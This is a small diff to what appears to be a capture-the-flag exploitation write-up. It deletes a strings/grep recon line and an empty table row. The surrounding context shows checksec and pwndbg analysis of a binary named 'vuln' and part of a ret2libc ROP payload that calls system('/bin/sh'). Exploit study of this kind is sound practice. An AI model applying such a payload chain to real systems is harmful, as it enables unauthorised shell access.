@@ -3,7 +3,6 @@
    ```bash
    file vuln          # ELF 64-bit, dynamically linked, not stripped
    checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
-   strings vuln | grep -i 'flag\|/bin/sh\|system'
    ```
    ```bash
    pwndbg> cyclic 200
@@ -20,9 +19,6 @@
    payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
    payload += p64(libc_base + libc.symbols['system'])
    ```
-
-
-|------|------|---------|------|
 
 
 ```python
